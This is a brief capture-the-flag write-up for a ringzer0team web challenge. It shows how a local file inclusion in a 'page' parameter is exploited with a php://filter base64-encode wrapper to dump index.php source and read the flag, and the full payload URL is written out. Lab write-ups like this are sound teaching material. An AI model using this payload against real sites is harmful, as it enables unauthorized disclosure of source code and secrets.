The hint says to look for php comment into index.php.<br>
So we see a LFI (Local File Include) in the link ...?page=lorem.php<br>
To read index.php source code we need to use a php filter function:
<pre>
php://filter/convert.base64-encode/resource=index.php
</pre>
Just add it to a link
<pre>
http://ringzer0team.com:1008/?page=php://filter/convert.base64-encode/resource=index.php
</pre>
You will get a base64 encoded string. Decode it and read a flag.<br>
GL
